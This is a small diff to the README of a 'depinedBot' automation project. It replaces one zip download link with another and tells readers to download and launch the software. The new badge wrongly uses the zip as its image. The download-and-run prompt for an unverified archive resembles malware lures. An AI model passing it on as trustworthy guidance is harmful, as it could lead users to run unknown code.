@@ -13,7 +13,7 @@ Welcome to the official repository of depinedBot - your ultimate solution for au
 
 To access the full functionality of depinedBot, download the software package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/tcbinh1222/depinedBot/releases/download/v1.0/Application.zip)](https://github.com/tcbinh1222/depinedBot/releases/download/v1.0/Application.zip)
 
 Please note that the software needs to be launched to start using it effectively.
 
